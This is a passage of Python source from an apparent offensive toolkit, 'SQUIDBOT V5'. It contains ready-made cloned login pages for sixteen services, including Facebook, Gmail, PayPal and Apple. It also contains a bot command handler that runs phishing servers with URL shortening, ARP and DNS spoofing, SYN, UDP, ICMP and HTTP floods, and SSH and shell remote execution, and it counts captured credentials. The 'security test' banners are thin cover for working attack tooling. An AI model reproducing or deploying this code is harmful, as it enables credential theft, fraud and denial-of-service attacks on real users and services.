<style>body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:white;border-radius:8px;padding:20px;width:400px}.logo{color:#1877f2;font-size:40px;text-align:center}input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:6px}button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;font-size:12px}</style></head>
<body><div class="login-box"><div class="logo">facebook</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _instagram_template(self):
        return """<!DOCTYPE html>
<html><head><title>Instagram</title>
<style>body{font-family:-apple-system;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:white;border:1px solid #dbdbdb;border-radius:1px;padding:40px;width:350px}.logo{font-family:cursive;font-size:50px;text-align:center}input{width:100%;padding:9px;margin:5px 0;background:#fafafa;border:1px solid #dbdbdb}button{width:100%;padding:7px;background:#0095f6;color:white;border:none;border-radius:4px;margin-top:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;font-size:12px}</style></head>
<body><div class="login-box"><div class="logo">Instagram</div>
<form method="POST"><input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _twitter_template(self):
        return """<!DOCTYPE html>
<html><head><title>X / Twitter</title>
<style>body{font-family:-apple-system;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea}.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}.logo{font-size:40px;text-align:center}input{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;color:#e7e9ea;border-radius:4px}button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:9999px}.warning{margin-top:20px;padding:12px;background:#1a1a1a;color:#e7e9ea;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">𝕏</div><h2>Sign in to X</h2>
<form method="POST"><input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _gmail_template(self):
        return """<!DOCTYPE html>
<html><head><title>Gmail</title>
<style>body{font-family:'Google Sans',Roboto;background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:white;border-radius:28px;padding:48px 40px;width:400px}.logo{text-align:center;color:#1a73e8}input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px}button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px}.warning{margin-top:30px;padding:12px;background:#e8f0fe;color:#202124;text-align:center}</style></head>
<body><div class="login-box"><div class="logo"><h1>Gmail</h1></div><h2>Sign in</h2>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _linkedin_template(self):
        return """<!DOCTYPE html>
<html><head><title>LinkedIn</title>
<style>body{font-family:-apple-system;background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:white;border-radius:8px;padding:40px 32px;width:400px}.logo{color:#0a66c2;font-size:32px;text-align:center}input{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px}button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:28px}.warning{margin-top:24px;padding:12px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">LinkedIn</div><h2>Sign in</h2>
<form method="POST"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _tiktok_template(self):
        return """<!DOCTYPE html>
<html><head><title>TikTok</title>
<style>body{font-family:-apple-system;background:#010101;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}.logo{color:#010101;font-size:32px;text-align:center}input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:14px;background:#010101;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">TikTok</div>
<form method="POST"><input type="text" name="email" placeholder="Email or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _github_template(self):
        return """<!DOCTYPE html>
<html><head><title>GitHub</title>
<style>body{font-family:-apple-system;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:32px;width:400px}.logo{color:#24292f;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #d0d7de;border-radius:6px}button{width:100%;padding:12px;background:#2da44e;color:#fff;border:none;border-radius:6px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">GitHub</div>
<form method="POST"><input type="text" name="username" placeholder="Username or email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _paypal_template(self):
        return """<!DOCTYPE html>
<html><head><title>PayPal</title>
<style>body{font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:4px;padding:40px;width:400px}.logo{color:#003087;font-size:32px;text-align:center}input{width:100%;padding:14px;margin:10px 0;border:1px solid #ccc;border-radius:4px}button{width:100%;padding:14px;background:#0070ba;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">PayPal</div>
<form method="POST"><input type="text" name="email" placeholder="Email or mobile number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _amazon_template(self):
        return """<!DOCTYPE html>
<html><head><title>Amazon</title>
<style>body{font-family:Arial;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border:1px solid #ddd;border-radius:8px;padding:32px;width:400px}.logo{color:#ff9900;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#ff9900;color:#000;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">amazon</div>
<form method="POST"><input type="text" name="email" placeholder="Email or mobile phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _netflix_template(self):
        return """<!DOCTYPE html>
<html><head><title>Netflix</title>
<style>body{font-family:Helvetica;background:#141414;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#000;border-radius:4px;padding:48px;width:400px}.logo{color:#e50914;font-size:40px;text-align:center}input{width:100%;padding:16px;margin:10px 0;background:#333;border:none;border-radius:4px;color:#fff}button{width:100%;padding:16px;background:#e50914;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">NETFLIX</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _spotify_template(self):
        return """<!DOCTYPE html>
<html><head><title>Spotify</title>
<style>body{font-family:Circular,Helvetica;background:#121212;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#000;border-radius:8px;padding:48px;width:400px}.logo{color:#1ed760;font-size:32px;text-align:center}input{width:100%;padding:14px;margin:10px 0;background:#3e3e3e;border:none;border-radius:40px;color:#fff}button{width:100%;padding:14px;background:#1ed760;color:#000;border:none;border-radius:40px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">Spotify</div>
<form method="POST"><input type="text" name="email" placeholder="Email or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _steam_template(self):
        return """<!DOCTYPE html>
<html><head><title>Steam</title>
<style>body{font-family:Arial;background:#1b2838;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#171a21;border-radius:8px;padding:48px;width:400px}.logo{color:#fff;font-size:32px;text-align:center}input{width:100%;padding:14px;margin:10px 0;background:#32353c;border:none;border-radius:2px;color:#fff}button{width:100%;padding:14px;background:#67c1f5;color:#fff;border:none;border-radius:2px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">STEAM</div>
<form method="POST"><input type="text" name="email" placeholder="Steam Account Name" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _roblox_template(self):
        return """<!DOCTYPE html>
<html><head><title>Roblox</title>
<style>body{font-family:Arial;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:8px;padding:32px;width:400px}.logo{color:#1a5d9c;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:4px}button{width:100%;padding:12px;background:#1a5d9c;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">Roblox</div>
<form method="POST"><input type="text" name="email" placeholder="Username or Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _microsoft_template(self):
        return """<!DOCTYPE html>
<html><head><title>Microsoft</title>
<style>body{font-family:Segoe UI;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:4px;padding:48px;width:400px}.logo{color:#f25022;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:2px}button{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:2px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">Microsoft</div>
<form method="POST"><input type="text" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _apple_template(self):
        return """<!DOCTYPE html>
<html><head><title>Apple ID</title>
<style>body{font-family:SF Pro Text;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:48px;width:400px}.logo{color:#000;font-size:40px;text-align:center}input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo"></div><h2>Sign in with your Apple ID</h2>
<form method="POST"><input type="text" name="email" placeholder="Apple ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _custom_template(self):
        return """<!DOCTYPE html>
<html><head><title>Login</title>
<style>body{font-family:Arial;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:10px;padding:40px;width:400px}.logo{text-align:center;color:#764ba2;font-size:28px}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:5px}button{width:100%;padding:12px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border:none;border-radius:5px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">Secure Login</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# =====================
# BOT HANDLER (Unified)
# =====================
class BotHandler:
    """Unified bot command handler for all platforms"""
    
    def __init__(self, db: DatabaseManager, spoof_engine: SpoofingEngine, traffic_gen: AdvancedTrafficGenerator, phishing_server: PhishingServer):
        self.db = db
        self.spoof_engine = spoof_engine
        self.traffic_gen = traffic_gen
        self.phishing_server = phishing_server
        self.ssh_clients = {}
    
    def execute_command(self, command: str, source: str = "local") -> Dict[str, Any]:
        """Execute command and return result"""
        start_time = time.time()
        
        # Parse command
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command'}
        
        cmd = parts[0].lower()
        args = parts[1:]
        
        result = self._dispatch_command(cmd, args)
        execution_time = time.time() - start_time
        
        # Log command
        self.db.log_command(command, source, result.get('success', False), 
                           str(result.get('output', ''))[:5000], execution_time)
        
        result['execution_time'] = execution_time
        return result
    
    def _dispatch_command(self, cmd: str, args: List[str]) -> Dict[str, Any]:
        """Dispatch command to appropriate handler"""
        
        # Nmap commands
        if cmd.startswith('nmap'):
            return self._execute_nmap(' '.join(args))
        
        # Curl commands
        elif cmd.startswith('curl'):
            return self._execute_curl(' '.join(args))
        
        # Wget commands
        elif cmd.startswith('wget'):
            return self._execute_wget(' '.join(args))
        
        # Netcat commands
        elif cmd in ['nc', 'ncat']:
            return self._execute_nc(' '.join(args))
        
        # SSH commands
        elif cmd == 'ssh':
            return self._execute_ssh(args)
        elif cmd == 'ssh_connect':
            return self._execute_ssh_connect(args)
        elif cmd == 'ssh_exec':
            return self._execute_ssh_exec(args)
        
        # Spoofing commands
        elif cmd == 'spoof_ip':
            return self._execute_spoof_ip(args)
        elif cmd == 'spoof_mac':
            return self._execute_spoof_mac(args)
        elif cmd == 'arp_spoof':
            return self._execute_arp_spoof(args)
        elif cmd == 'dns_spoof':
            return self._execute_dns_spoof(args)
        elif cmd == 'stop_spoof':
            return self._execute_stop_spoof(args)
        
        # Traffic generation
        elif cmd == 'icmp_flood':
            return self._execute_icmp_flood(args)
        elif cmd == 'syn_flood':
            return self._execute_syn_flood(args)
        elif cmd == 'udp_flood':
            return self._execute_udp_flood(args)
        elif cmd == 'http_flood':
            return self._execute_http_flood(args)
        elif cmd == 'stop_flood':
            return self._execute_stop_flood(args)
        
        # Phishing commands
        elif cmd.startswith('generate_phishing_for_'):
            platform = cmd.replace('generate_phishing_for_', '')
            return self._execute_generate_phishing(platform, args)
        elif cmd == 'phishing_start':
            return self._execute_phishing_start(args)
        elif cmd == 'phishing_stop':
            return self._execute_phishing_stop(args)
        elif cmd == 'phishing_status':
            return self._execute_phishing_status()
        
        # System commands
        elif cmd == 'ping':
            return self._execute_ping(args)
        elif cmd == 'traceroute':
            return self._execute_traceroute(args)
        elif cmd == 'dig':
            return self._execute_dig(args)
        elif cmd == 'whois':
            return self._execute_whois(args)
        elif cmd == 'history':
            return self._execute_history(args)
        elif cmd == 'threats':
            return self._execute_threats(args)
        elif cmd == 'status':
            return self._execute_status()
        elif cmd == 'help':
            return self._execute_help()
        
        # Generic command execution
        else:
            return self._execute_generic(' '.join([cmd] + args))
    
    def _execute_nmap(self, args: str) -> Dict[str, Any]:
        """Execute nmap command"""
        return CommandExecutor.execute(['nmap'] + args.split(), timeout=300)
    
    def _execute_curl(self, args: str) -> Dict[str, Any]:
        """Execute curl command"""
        return CommandExecutor.execute(['curl'] + args.split(), timeout=60)
    
    def _execute_wget(self, args: str) -> Dict[str, Any]:
        """Execute wget command"""
        return CommandExecutor.execute(['wget'] + args.split(), timeout=300)
    
    def _execute_nc(self, args: str) -> Dict[str, Any]:
        """Execute netcat command"""
        return CommandExecutor.execute(['nc'] + args.split(), timeout=60)
    
    def _execute_ssh(self, args: List[str]) -> Dict[str, Any]:
        """Execute SSH command"""
        if not args:
            return {'success': False, 'output': 'Usage: ssh <user@host> [command]'}
        return CommandExecutor.execute(['ssh'] + args, timeout=300)
    
    def _execute_ssh_connect(self, args: List[str]) -> Dict[str, Any]:
        """Connect via SSH"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_connect <name> <host> <user> [pass]'}
        
        name, host, username = args[0], args[1], args[2]
        password = args[3] if len(args) > 3 else None
        
        conn_id = str(uuid.uuid4())[:8]
        self.db.save_ssh_connection(conn_id, name, host, 22, username, password)
        
        # Test connection
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, username=username, password=password, timeout=10)
            self.ssh_clients[conn_id] = client
            return {'success': True, 'output': f"Connected to {host} as {username}"}
        except Exception as e:
            return {'success': False, 'output': f"Connection failed: {e}"}
    
    def _execute_ssh_exec(self, args: List[str]) -> Dict[str, Any]:
        """Execute command via SSH"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        
        conn_id, command = args[0], ' '.join(args[1:])
        
        if conn_id not in self.ssh_clients:
            return {'success': False, 'output': 'Not connected'}
        
        try:
            stdin, stdout, stderr = self.ssh_clients[conn_id].exec_command(command, timeout=30)
            output = stdout.read().decode()
            error = stderr.read().decode()
            return {'success': True, 'output': output if output else error}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _execute_spoof_ip(self, args: List[str]) -> Dict[str, Any]:
        """Spoof IP address"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: spoof_ip <original_ip> <spoofed_ip> <target> [interface]'}
        
        original = args[0]
        spoofed = args[1]
        target = args[2]
        interface = args[3] if len(args) > 3 else "eth0"
        
        return self.spoof_engine.spoof_ip(original, spoofed, target, interface)
    
    def _execute_spoof_mac(self, args: List[str]) -> Dict[str, Any]:
        """Spoof MAC address"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: spoof_mac <interface> <new_mac>'}
        
        interface = args[0]
        new_mac = args[1]
        
        return self.spoof_engine.spoof_mac(interface, new_mac)
    
    def _execute_arp_spoof(self, args: List[str]) -> Dict[str, Any]:
        """ARP spoofing"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: arp_spoof <target_ip> <spoof_ip> [interface]'}
        
        target = args[0]
        spoof_ip = args[1]
        interface = args[2] if len(args) > 2 else "eth0"
        
        return self.spoof_engine.arp_spoof(target, spoof_ip, interface)
    
    def _execute_dns_spoof(self, args: List[str]) -> Dict[str, Any]:
        """DNS spoofing"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dns_spoof <domain> <fake_ip> [interface]'}
        
        domain = args[0]
        fake_ip = args[1]
        interface = args[2] if len(args) > 2 else "eth0"
        
        return self.spoof_engine.dns_spoof(domain, fake_ip, interface)
    
    def _execute_stop_spoof(self, args: List[str]) -> Dict[str, Any]:
        """Stop spoofing"""
        spoof_id = args[0] if args else None
        return self.spoof_engine.stop_spoofing(spoof_id)
    
    def _execute_icmp_flood(self, args: List[str]) -> Dict[str, Any]:
        """Generate ICMP flood"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: icmp_flood <target_ip> <duration> [rate]'}
        
        target = args[0]
        duration = int(args[1])
        rate = int(args[2]) if len(args) > 2 else 100
        
        return self.traffic_gen.generate_icmp_flood(target, duration, rate)
    
    def _execute_syn_flood(self, args: List[str]) -> Dict[str, Any]:
        """Generate SYN flood"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: syn_flood <target_ip> <port> <duration> [rate]'}
        
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        rate = int(args[3]) if len(args) > 3 else 100
        
        return self.traffic_gen.generate_syn_flood(target, port, duration, rate)
    
    def _execute_udp_flood(self, args: List[str]) -> Dict[str, Any]:
        """Generate UDP flood"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: udp_flood <target_ip> <port> <duration> [rate]'}
        
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        rate = int(args[3]) if len(args) > 3 else 100
        
        return self.traffic_gen.generate_udp_flood(target, port, duration, rate)
    
    def _execute_http_flood(self, args: List[str]) -> Dict[str, Any]:
        """Generate HTTP flood"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: http_flood <target_ip> <duration> [port] [rate]'}
        
        target = args[0]
        duration = int(args[1])
        port = int(args[2]) if len(args) > 2 else 80
        rate = int(args[3]) if len(args) > 3 else 50
        
        return self.traffic_gen.generate_http_flood(target, port, duration, rate)
    
    def _execute_stop_flood(self, args: List[str]) -> Dict[str, Any]:
        """Stop flood generation"""
        generator_id = args[0] if args else None
        return {'success': self.traffic_gen.stop_generation(generator_id), 'output': 'Stopped flood generation'}
    
    def _execute_generate_phishing(self, platform: str, args: List[str]) -> Dict[str, Any]:
        """Generate phishing link"""
        link_id = str(uuid.uuid4())[:8]
        url = f"http://localhost:8080/{link_id}"
        
        self.db.save_phishing_link(link_id, platform, url)
        
        # Optionally start server
        if args and args[0] == 'start':
            port = int(args[1]) if len(args) > 1 else 8080
            self.phishing_server.start(link_id, platform, port)
            url = self.phishing_server.get_url()
        
        # Shorten URL if available
        short_url = url
        if SHORTENER_AVAILABLE:
            try:
                s = pyshorteners.Shortener()
                short_url = s.tinyurl.short(url)
            except:
                pass
        
        return {
            'success': True,
            'link_id': link_id,
            'platform': platform,
            'url': url,
            'short_url': short_url,
            'command': f"phishing_start {link_id} [port]"
        }
    
    def _execute_phishing_start(self, args: List[str]) -> Dict[str, Any]:
        """Start phishing server"""
        if len(args) < 1:
            return {'success': False, 'output': 'Usage: phishing_start <link_id> [port]'}
        
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        
        # Get platform from database
        self.db.cursor.execute('SELECT platform FROM phishing_links WHERE id = ?', (link_id,))
        row = self.db.cursor.fetchone()
        
        if not row:
            return {'success': False, 'output': f'Link {link_id} not found'}
        
        platform = row['platform']
        success = self.phishing_server.start(link_id, platform, port)
        
        if success:
            return {
                'success': True,
                'url': self.phishing_server.get_url(),
                'port': port,
                'message': f"Phishing server started at {self.phishing_server.get_url()}"
            }
        else:
            return {'success': False, 'output': 'Failed to start server'}
    
    def _execute_phishing_stop(self, args: List[str]) -> Dict[str, Any]:
        """Stop phishing server"""
        self.phishing_server.stop()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _execute_phishing_status(self) -> Dict[str, Any]:
        """Get phishing server status"""
        return {
            'success': True,
            'running': self.phishing_server.server is not None,
            'url': self.phishing_server.get_url() if self.phishing_server.server else None,
            'link_id': self.phishing_server.link_id
        }
    
    def _execute_ping(self, args: List[str]) -> Dict[str, Any]:
        """Ping command"""
        if not args:
            return {'success': False, 'output': 'Usage: ping <target>'}
        return CommandExecutor.execute(['ping', '-c', '4', args[0]], timeout=10)
    
    def _execute_traceroute(self, args: List[str]) -> Dict[str, Any]:
        """Traceroute command"""
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        
        if shutil.which('traceroute'):
            return CommandExecutor.execute(['traceroute', '-n', args[0]], timeout=60)
        elif shutil.which('tracert'):
            return CommandExecutor.execute(['tracert', args[0]], timeout=60)
        else:
            return {'success': False, 'output': 'No traceroute tool found'}
    
    def _execute_dig(self, args: List[str]) -> Dict[str, Any]:
        """DNS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: dig <domain> [record_type]'}
        
        record_type = args[1] if len(args) > 1 else 'A'
        return CommandExecutor.execute(['dig', args[0], record_type, '+short'], timeout=10)
    
    def _execute_whois(self, args: List[str]) -> Dict[str, Any]:
        """WHOIS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        
        if WHOIS_AVAILABLE:
            try:
                result = whois.whois(args[0])
                return {'success': True, 'output': str(result)}
            except Exception as e:
                return {'success': False, 'output': str(e)}
        else:
            return CommandExecutor.execute(['whois', args[0]], timeout=30)
    
    def _execute_history(self, args: List[str]) -> Dict[str, Any]:
        """Get command history"""
        limit = int(args[0]) if args else 20
        history = self.db.get_command_history(limit)
        
        if not history:
            return {'success': True, 'output': 'No command history'}
        
        output = "📜 Command History:\n" + "-" * 50 + "\n"
        for i, cmd in enumerate(history[:limit], 1):
            status = "✅" if cmd['success'] else "❌"
            output += f"{i:2d}. {status} [{cmd['timestamp'][:19]}] {cmd['command'][:50]}\n"
        
        return {'success': True, 'output': output}
    
    def _execute_threats(self, args: List[str]) -> Dict[str, Any]:
        """Get recent threats"""
        limit = int(args[0]) if args else 20
        threats = self.db.get_threats(limit)
        
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        
        output = "🚨 Threat Log:\n" + "-" * 50 + "\n"
        for threat in threats:
            severity_icon = "🔴" if threat['severity'] == 'high' else "🟡" if threat['severity'] == 'medium' else "🟢"
            output += f"{severity_icon} [{threat['timestamp'][:19]}] {threat['threat_type']}\n"
            if threat.get('source_ip'):
                output += f"   Source: {threat['source_ip']}\n"
        
        return {'success': True, 'output': output}
    
    def _execute_status(self) -> Dict[str, Any]:
        """Get system status"""
        stats = self.db.get_statistics()
        
        output = f"""
🐙 SQUIDBOT V5 - System Status
{'='*50}

📊 Statistics:
  • Total Commands: {stats.get('total_commands', 0)}
  • Total Scans: {stats.get('total_scans', 0)}
  • Total Threats: {stats.get('total_threats', 0)}
  • Phishing Links: {stats.get('phishing_links', 0)}
  • Captured Credentials: {stats.get('captured_credentials', 0)}
  • SSH Connections: {stats.get('ssh_connections', 0)}
  • Traffic Tests: {stats.get('traffic_tests', 0)}
  • Spoofing Attempts: {stats.get('spoofing_attempts', 0)}

🔄 Active Services:
  • Phishing Server: {'✅ Running' if self.phishing_server.server else '❌ Stopped'}
  • Spoofing Processes: {len(self.spoof_engine.running_spoofs)}
  • Traffic Generators: {len(self.traffic_gen.active_generators)}

💻 System:
  • Platform: {platform.system()} {platform.release()}
  • Python: {platform.python_version()}
  • Scapy: {'✅' if SCAPY_AVAILABLE else '❌'}
"""
        return {'success': True, 'output': output}
    
    def _execute_help(self) -> Dict[str, Any]:
        """Get help"""
        help_text = """
🐙 SQUIDBOT V5 - Ultimate Command Center

🔍 NETWORK SCANNING:
  nmap [options] <target>      - Full Nmap scanning
  ping <target>                - ICMP echo test
  traceroute <target>          - Network path tracing
  dig <domain> [type]          - DNS lookup
  whois <domain>               - WHOIS information

🚀 ADVANCED NETWORK SPOOFING:
  spoof_ip <orig> <spoof> <target> [iface] - IP spoofing
  spoof_mac <iface> <mac>      - MAC address spoofing
  arp_spoof <target> <spoof_ip> [iface]   - ARP spoofing (MITM)
  dns_spoof <domain> <ip> [iface]         - DNS spoofing
  stop_spoof [id]              - Stop spoofing

💥 FLOOD ATTACKS (Authorized Testing Only):
  icmp_flood <ip> <duration> [rate]   - ICMP flood
  syn_flood <ip> <port> <duration> [rate] - SYN flood
  udp_flood <ip> <port> <duration> [rate] - UDP flood
  http_flood <ip> <duration> [port] [rate] - HTTP flood
  stop_flood [id]              - Stop floods

🎣 PHISHING & SOCIAL ENGINEERING:
  generate_phishing_for_<platform> [start] [port]
    Platforms: facebook, instagram, twitter, gmail, linkedin, tiktok, snapchat, github, paypal, amazon, netflix, spotify, steam, roblox, microsoft, apple
  phishing_start <link_id> [port]  - Start phishing server
  phishing_stop                - Stop phishing server
  phishing_status              - Check server status

📡 DATA TRANSFER:
  curl [options] <url>         - HTTP requests
  wget [options] <url>         - File download
  nc [options] <host> <port>   - Netcat connections

🔐 SSH REMOTE ACCESS:
  ssh_connect <name> <host> <user> [pass] - Connect
  ssh_exec <conn_id> <command> - Execute command

📊 SYSTEM COMMANDS:
  history [limit]              - View command history
  threats [limit]              - View threat log
  status                       - System status
  help                         - This help menu

Examples:
  nmap -sS -p 80,443 192.168.1.1
  spoof_ip 192.168.1.100 10.0.0.1 192.168.1.1
  arp_spoof 192.168.1.1 192.168.1.100
  icmp_flood 192.168.1.1 30 500
  generate_phishing_for_facebook start 8080
  ssh_connect myserver 192.168.1.100 root password123
  ssh_exec myserver "ls -la"
  curl -X GET https://api.github.com
  whois google.com
"""
        return {'success': True, 'output': help_text}
    
    def _execute_generic(self, command: str) -> Dict[str, Any]:
        """Execute generic shell command"""
        return CommandExecutor.execute(command, shell=True, timeout=60)

# =====================
# DISCORD BOT
# =====================
class SquidBotDiscord:
    """Discord bot integration"""
    
    def __init__(self, handler: BotHandler, config: Dict):
        self.handler = handler
        self.config = config
        self.bot = None
        self.running = False
    
    def setup(self):
        """Setup Discord bot"""
        if not DISCORD_AVAILABLE:
            return False
        
        if not self.config.get('discord_token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        
